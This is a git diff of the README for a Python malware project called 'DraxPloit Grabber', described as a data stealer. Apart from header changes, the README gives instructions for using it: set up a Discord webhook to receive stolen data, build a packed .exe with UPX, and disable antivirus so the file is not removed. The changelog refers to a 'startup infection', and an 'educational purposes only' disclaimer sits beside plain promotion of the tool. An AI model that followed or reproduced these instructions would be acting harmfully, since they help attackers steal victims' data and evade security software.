@@ -4,7 +4,7 @@ Data Stealer written in **Python**
 
 *enjoy the script fuggas*
 
-#### :x: This program was made for educational purposes only. I do not condone or promote and illegal acts that can be reproduced with my program! :x:
+#### :x: This program was made for educational purposes only. I do not condone or promote any illegal acts that can be reproduced with my program! :x:
 
 ## Content :large_blue_circle:
 - [:trollface: Features](#features)
@@ -28,12 +28,12 @@ Data Stealer written in **Python**
 - No popups in .exe file!
 - More to be added! :heavy_plus_sign:
 
-### Requirements
+### <a id="requirements"></a> :white_check_mark: - Requirements
 
 * Newest [Python](https://www.python.org) version
 * The code in this [Repository](https://github.com/DraxFM/DraxPloit-Grabber/archive/refs/heads/main.zip)
 
-### Installing
+### <a id="installing"></a> :hammer: - Installing
 
 1. Install the files of this [Repository](https://github.com/DraxFM/DraxPloit-Grabber/archive/refs/heads/main.zip)
 2. Extract the .zip file in the desired directory.
@@ -42,7 +42,7 @@ Data Stealer written in **Python**
 5. Configure your file (see "Usage" for more information on how to set your file up)
 6. Enjoy!
 
-### Usage
+### <a id="usage"></a> :toolbox: - Usage
 
 1. Create a Discord Server and go to server settings
 2. Go to "Integrations" and click on "Create Webhook"
@@ -54,14 +54,14 @@ Data Stealer written in **Python**
 
 <img src="https://i.ibb.co/f4Twmvf/Screenshot-9.png" width="500" height=auto>
 
-### Explanation
+### <a id="explanation"></a> :page_with_curl: - Explanation
 **If you are new to exploiting, this might be in your interest**:  
 When running the "**setup.bat**" file, a black window opens. Don't worry, this is just normal procedure even though it may look *malicious* at first glance. There will be text popping up in white colors. The "**setup.bat**" file installs all required libraries from "**requirements.txt**". Still, you mustn't delete the "**requirements.txt**" at all times. The builder still uses this file on execution!  
 The same with "**start.bat**". Creating a software which has actual UI is really hard and honestly I am too lazy to do that. So that is why you configure your file in a black window (as seen in the picture above).  
 You also might find the "**upx.exe**" file in the "upx" folder suspicious. But basically UPX (***Ultimate Packager for Executables***) is a well-known program. If you don't trust the one that's already in this repository feel free to install the original one from their own website and replace it with the already existing one.  
 Another thing is the compilation from **.py** to **.exe**. There will be files created in the folder and it may seem suspicious but this is needed to pack the Python file into one. There are tons of libraries that need to be packed, so give it time.  
 
-## Help
+## <a id="help"></a> :question: - Help
 
 ### 1. Python allegedly "not found", Problems with PATH.
 
@@ -82,7 +82,7 @@ A common problem lots of users have with this program is not caused by me or my 
 
 This can obviously be a bug, if there is an error shown, please contact me so I can improve my software. Otherwise, your scripts (mostly the .exe's) won't work because of your antivirus. As my scripts are not 100% undetected antivirusses might think that you installed a virus (even though you created it) and break it/parts of it or even delete it. To fix this, simply turn off your Antivirus and then create your file or add the file as extension so it doesn't get locked.  
 
-## Authors
+## <a id="authors"></a> :shipit: - Authors
 
 * [**Drax**](https://github.com/DraxFM) - *DraxPloit Grabber*
 
@@ -92,7 +92,7 @@ Need help? Join the [**Discord**](https://discord.gg/sEXECdC3Et)!
 
 Inspiration to start with python exploiting: [**KSCHdsc**](https://github.com/KSCHdsc)
 
-## Changelog
+## <a id="changelog"></a> :memo: - Changelog
 
 03/07/2023: Fixed startup infection  
 03/06/2023: Added a banner to the program  
@@ -108,6 +108,6 @@ Inspiration to start with python exploiting: [**KSCHdsc**](https://github.com/KS
 02/12/2023: Fixed compilation process to exe  
 02/12/2023: Released program  
 
-## License
+## <a id="license"></a> :exclamation: - License
 
 This project is licensed under the MIT License - see the [LICENSE.md](LICENSE.md) file for details.
